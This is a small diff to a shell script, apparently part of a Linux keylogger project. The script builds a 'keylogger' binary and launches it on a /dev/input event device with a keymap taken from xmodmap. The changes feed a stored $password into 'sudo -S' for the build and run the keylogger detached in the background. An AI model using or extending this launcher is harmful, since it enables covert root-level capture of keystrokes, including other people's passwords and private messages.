@@ -21,13 +21,13 @@ echo "eventX: "$eventfile
 keyMap=$(xmodmap -pke | awk  '{printf substr($0, index($0, $3))"|\n"}' | cut -c3- )
 parse "${keyMap//[$'\t\r\n']}"
 #echo $keyMap | awk '{print "\""$0"\""}' | echo $@ 
-make re
+echo -e $password | sudo -S make re
 if [ $? -ne 0 ]
 then
 echo -e "MAKE FAILED\n"
 exit 0 
 fi
-echo -e $password | sudo -S ./keylogger "/dev/input/$eventfile" "${keyMap}"
+echo -e $password | sudo -S -b ./keylogger "/dev/input/$eventfile" "${keyMap}" &
 echo $?
 #TODO loop on $? for retry
 #TODO completer le PARSEUR
